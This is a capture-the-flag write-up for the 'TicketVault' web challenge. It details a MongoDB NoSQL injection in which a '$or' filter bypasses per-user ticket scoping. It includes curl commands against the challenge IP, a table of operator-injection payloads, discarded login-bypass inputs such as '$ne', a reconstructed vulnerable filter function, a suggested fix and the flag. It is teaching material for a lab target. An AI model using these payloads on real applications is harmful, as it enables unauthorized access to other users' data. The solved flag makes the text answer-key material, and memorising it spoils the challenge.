---
title: "TicketVault"
ctf: "2026-battleCTF"
category: "web"
difficulty: "hard"
points: 30
techniques: ["sql-injection", "encoding"]
tools: ["strings", "curl", "python"]
keywords: ["TicketVault", "battleCTF", "web", "sql-injection", "encoding", "strings", "curl", "python", "http"]
status: "solved"
has_script: true
source: "battleCTF/CHALLENGES/web/TicketVault/notes.md"
---

# TicketVault (battleCTF, web)

## Summary
Challenge **TicketVault** from the battleCTF CTF, web category. Main technique: sql-injection. The TicketVault challenge (battleCTF, web) is documented by a resolution note.

## Statement and artefacts
TicketVault is a small internal support portal: every user creates and views their own tickets. The admin's inbox holds the post-mortem for a recent incident, but obviously, you're not supposed to be able to read it.

**Provided files / artifacts:**
- `work/package.json (text, 268 B)`

## Recognition signals
- Signal: FLAW 1: any filter containing $or is returned without scope -> total leak.
- If we look at FLAW 2, think about scoping forces only parsed.owner = user (literal key).

## Resolution method
1. **TL;DR**

NoSQL injection (MongoDB) via the "Advanced filter (JSON)" field of `/tickets/search`. The `owner` scope is only forced if the `owner` key is at the first level of the filter, and the code returns any filter containing `$or` as is. We therefore read the admin tickets with:

```
GET /tickets/search?filter={"$or":[{"owner":"admin"}]}
```

The admin ticket "Root cause analysis - incident 2024-03" contains the flag.

2. **App**

Node/Express + MongoDB. `server.js` provided, but the sensitive logic is in two modules NOT provided:
- `utils/sanitize.js` -> `resolveLoginCredentials(req)`
- `utils/ticketFilter.js` -> `buildScopedFilter(req)`

Key routes:
- `POST /register`: `req.session.username = req.body.username` (raw), insert `{username, password}`.
- `POST /login`: `findOne({username, password})` after `resolveLoginCredentials`.
- `GET /tickets`: `find({ owner: req.session.username })`.
- `GET /tickets/search`: `find(buildScopedFilter(req))`, with params `q` and `filter`.

Objective: read the admin ticket (postmortem).

3. **Fix**

- Always wrap the user filter and ANDer the scope, without trusting the branches provided:
  ```js
  return { $and: [ { owner: user }, parsed ] };
  ```
- In addition: whitelist the operators authorized in `parsed`, ban `$where`, and never treat `$or`/`$nor` as a special case that bypasses the scope.
- Login rating: keep the String cast (already done) to block operator injection.

4. **Reproduction (one line)**

```
# 1) create an account
curl -s -c cj -X POST http://144.217.91.111:3001/register \
  --data-urlencode username=u$RANDOM --data-urlencode password=p -o /dev/null
# 2) read admin tickets
curl -s -b cj --get http://144.217.91.111:3001/tickets/search \
  --data-urlencode 'filter={"$or":[{"owner":"admin"}]}' | grep -i ctf
```

See `work/solve.py` for the full script.

5. **The flaw (buildScopedFilter)**

Observed behavior (test matrix):

| filter send | result |
|------------------------------------------------|---------------------|
| `{"owner":"admin"}` | my tickets |
| `{"owner":{"$ne":"me"}}` | my tickets |
| `{"subject":{"$exists":true}}` | my tickets |
| `{}`                                           | my tickets |
| `{"$where":"return true"}` | my tickets |
| `{"$or":[{"owner":"admin"}]}` | **admin ticket** |
| `{"$or":[{"owner":"admin"},{"owner":"me"}]}` | **admin + me** |

Only `$or` escapes the scope. Most consistent reconstruction with all cases:

```js
// utils/ticketFilter.js (reconstructed from behavior)
function buildScopedFilter(req) {
  const user = req.session.username;
  let parsed = {};
  if (req.query.filter) {
    try { parsed = JSON.parse(req.query.filter); } catch (e) { parsed = {}; }
  } else if (req.query.q) {
    parsed = { subject: { $regex: req.query.q, $options: 'i' } };
  }

  // FLAW 1: the "support" of the OR advances short-circuits all scoping
  if (parsed.$or) {
    return parsed;              // <-- returns as is, NO owner imposes
  }

  // FLAW 2: only protects the literal "owner" key at the top-level
  parsed.owner = user;
  return parsed;
}
```

Two faults:
- **FLAW 1**: any filter containing `$or` is returned without scope -> total leak.
- **FLAW 2**: scoping forces only `parsed.owner = user` (literal key). It does not wrap the user filter, so any top-level logical operator that does not pass through this line bypasses the restriction.

## Discarded approaches
- {"username":{"$ne":null},"password":{"$ne":null}}, {"$gt":""}, username[$ne]=x
- filter={"owner":"admin"} -> returns YOUR tickets (owner forces the session).
- filter={"owner":{"$ne":"<you>"}} -> ditto, your tickets.
- Same filter={}, filter={"subject":{"$exists":true}}, filter={"$where":"return true"}

## Solve script
Script path: [scripts/solve.py](scripts/solve.py)

## Flag
CTF{a1428a3ae5db7d74d6c6d1eab1c6296f}

## Lessons and reusable patterns
- Main technique: sql-injection.
